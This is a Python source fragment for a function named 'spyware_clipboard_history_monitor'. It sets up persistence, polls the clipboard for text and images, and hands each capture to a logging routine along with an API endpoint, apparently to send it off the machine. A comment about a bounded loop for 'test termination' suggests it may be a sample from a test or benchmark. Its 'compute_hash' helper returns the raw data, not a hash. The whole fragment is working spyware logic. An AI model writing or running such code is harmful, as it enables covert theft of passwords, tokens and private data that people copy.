def compute_hash(data):
    if data is None:
        return b""
    if isinstance(data, str):
        return data.encode("utf-8", errors="ignore")
    return data


def spyware_clipboard_history_monitor(output_file: str = OUTPUT_FILE, api_endpoint: str = DEFAULT_API_ENDPOINT) -> None:
    global OUTPUT_FILE
    OUTPUT_FILE = output_file

    establish_persistence()

    try:
        tf = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
        temp_img_path = tf.name
        tf.close()
    except Exception:
        temp_img_path = os.path.join(".", "target", "temp_clipboard.png")
        os.makedirs(os.path.dirname(temp_img_path), exist_ok=True)

    try:
        initial_text, initial_image = get_clipboard_content(temp_img_path)
        last_text_hash = compute_hash(initial_text)
        last_image_hash = compute_hash(initial_image)

        if initial_text is not None and len(initial_text) > 0:
            append_to_log("TEXT", initial_text, api_endpoint)
        if initial_image is not None and len(initial_image) > 0:
            append_to_log("IMAGE", initial_image, api_endpoint)

        poll_interval = 0.5
        cycles = 3  # bounded loop for safety and test termination
        for _ in range(cycles):
            time.sleep(poll_interval)
            current_text, current_image = get_clipboard_content(temp_img_path)
            current_text_hash = compute_hash(current_text)
            current_image_hash = compute_hash(current_image)

            if current_text_hash != last_text_hash or current_image_hash != last_image_hash:
                if current_text_hash != last_text_hash:
                    if current_text is not None and len(current_text) > 0:
                        append_to_log("TEXT", current_text, api_endpoint)
                    last_text_hash = current_text_hash

                if current_image_hash != last_image_hash:
                    if current_image is not None and len(current_image) > 0:
                        append_to_log("IMAGE", current_image, api_endpoint)
                    last_image_hash = current_image_hash
                break
    finally:
        if os.path.exists(temp_img_path):
            try:
                os.remove(temp_img_path)
            except Exception:
                pass


